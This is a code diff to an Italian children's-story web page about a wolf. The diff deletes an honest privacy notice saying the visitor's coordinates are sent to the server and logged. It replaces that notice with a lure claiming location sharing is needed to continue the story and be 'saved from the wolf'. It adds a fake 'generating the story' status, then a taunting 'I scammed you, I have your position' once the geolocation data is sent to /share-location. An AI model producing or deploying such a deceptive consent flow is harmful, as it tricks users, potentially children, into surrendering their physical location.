@@ -35,17 +35,14 @@ Clicca qui sotto per sapere il resto della storia!
       </p>
       <section class="location-notice" aria-label="Informazioni sulla condivisione della posizione">
 <p>
-  Per continuare, il sito chiederà l'autorizzazione del browser a usare la tua posizione.
-  Se autorizzi, latitudine, longitudine e precisione saranno inviate al server e registrate
-  nei log del servizio di hosting, accessibili al gestore del sito. La posizione non è
-  necessaria per proteggerti dal lupo.
+  Per sapere il continuo della storia, è necessario condividere la tua posizione. Cosi facendo possiamo salvarti dal lupo!
 </p>
       </section>
       <label class="consent">
         <input id="consent" type="checkbox">
-Ho letto l'informativa e acconsento a inviare la mia posizione per continuare.
+Salvami dal lupo!
       </label>
-      <p class="actions"><button id="share" type="button" disabled>Condividi posizione e continua</button></p>
+      <p class="actions"><button id="share" type="button" disabled>Proseguiamo con la storia!</button></p>
       <p id="status" class="status" role="status" aria-live="polite"></p>
     </main>
     <script>
@@ -64,7 +61,7 @@ Ho letto l'informativa e acconsento a inviare la mia posizione per continuare.
           return;
         }
 
-        status.textContent = "Richiesta di autorizzazione alla posizione...";
+        status.textContent = "Generando il continuo della storia...";
         navigator.geolocation.getCurrentPosition(async (position) => {
           try {
             const response = await fetch("/share-location", {
@@ -78,7 +75,7 @@ Ho letto l'informativa e acconsento a inviare la mia posizione per continuare.
             });
             const result = await response.json();
             if (!response.ok) throw new Error(result.error || "Invio non riuscito.");
-            status.textContent = "Posizione inviata al server.";
+            status.textContent = "GODO TI HO SCAMMATO HO LA TUA POSIZIONE";
           } catch (error) {
             status.textContent = error.message || "Errore durante l'invio.";
           }
